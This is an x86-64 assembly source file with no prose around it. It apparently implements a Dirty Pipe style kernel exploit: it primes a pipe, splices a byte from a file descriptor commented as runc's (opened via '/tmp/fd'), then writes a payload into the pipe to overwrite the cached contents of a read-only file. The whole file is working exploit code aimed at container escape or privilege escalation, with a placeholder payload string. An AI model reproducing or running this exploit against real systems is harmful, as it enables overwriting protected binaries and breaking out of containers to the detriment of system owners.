global _start

section .text

_start:
    call main

main:
    sub rsp, 0x10008

; *******************
; prepare_pipe
; *******************
prepare_pipe:
    mov rax, SYS_PIPE
    mov rdi, rsp                                       ; p
    syscall

; *******************
; write
; init pipe with 65536
; *******************
write: 
    mov rax, SYS_WRITE
    mov rdx, PAGE_SIZE
    lea rsi, [rsp+8]                                ;buffer
    mov edi, [rsp+4]
    syscall

; *******************
; read
; init pipe with 65536
; *******************
read: 
    mov rax, SYS_READ
    mov rdx, PAGE_SIZE
    lea rsi,  [rsp+8]                         ;buffer
    mov edi,  [rsp]                          ; p[0]
    syscall

; *******************
; open
; get runc's fd
; *******************
open:
    mov rax, SYS_OPEN
    mov rdx, 0
    mov rsi, O_RDONLY                          ;flags
    mov rdi, runc                                       ;filename
    syscall

    cmp     rax, 0                                        ; check for success
    jl      errorOnOpen
    mov qword [fileDesc], rax        

; *******************
; splice
; *******************
splice: 
    mov rax, SYS_SPLICE
    mov r9, 0                                                     ; flags
    mov r8, 1                                                     ; len
    mov rcx, NULL                                           ; off_out
    mov edx, [rsp+4]                                          ; p[1]
    mov rsi,   0                                                  ; offset
    mov rdi,  qword [fileDesc]                          ; fd
    syscall

; *******************
; write_payload
; 
; *******************
write_payload: 
    mov rdx, MAX_LENGTH                                ; length
    mov rsi,   payload                                             ; payload
    mov edi, [rsp+4]                                       ; p[1]
    mov rax, SYS_WRITE
    syscall

; *******************
; exit
; *******************
exit:
    mov       rax, SYS_EXIT
    xor       rdi, rdi                      ; exit code 0
    syscall                               ; invoke operating system to exit

; *******************
; errorOnOpen
; *******************
errorOnOpen:
    mov    rdi, errMsgOpen 
    call     printString
    call     exit

; *******************
; printString
; *******************
printString:
    push    rbp
    mov     rbp, rsp 
    push    rbx
    ;  Count characters in string.
    mov     rbx, rdi
    mov     rdx, 0 
strCountLoop:
    cmp     byte [rbx], NULL 
    je      strCountDone     
    inc     rdx
    inc     rbx
    jmp     strCountLoop
strCountDone:
    cmp     rdx, 0 
    je      prtDone
    ;  Call OS to output string.
    mov     rax, SYS_WRITE                 ; code for write ()
    mov     rsi, rdi                                   ; addr of characters
    mov     rdi, STDOUT                        ; file descriptor
                                                             ; count set above
    syscall                                               ; system call
prtDone:
    pop     rbx
    pop     rbp 
    ret 

section .data
    ; ********syscall*******
    SYS_READ:                   equ 0
    SYS_WRITE:                  equ 1
    SYS_OPEN:                   equ 2
    SYS_PIPE:                   equ 22
    SYS_EXIT:                       equ 60
    SYS_SPLICE:                 equ 275
    ; ********flag*******
    LF                                  equ    10            ; line feed
    NULL                            equ    0             ; end of string
    STDOUT:                       equ 1
    O_RDONLY           equ    000000q        ; read only
    BUFF_SIZE          equ 255
    PAGE_SIZE           equ 65536
    MAX_LENGTH equ 10
    ; ********string*******
    runc db '/tmp/fd',NULL ; runc fd
    writeDone      db       "Write Completed.", LF, NULL
    errMsgWrite    db       "Error writing to file.", LF, NULL
    errMsgOpen         db    "Error opening the file.", LF, NULL
    errMsgRead         db    "Error reading from the file.", LF, NULL
    fileDesc       dq       0
    payload db "st0n3st0n3st0n3",NULL

section    .bss
readBuffer resb     BUFF_SIZE
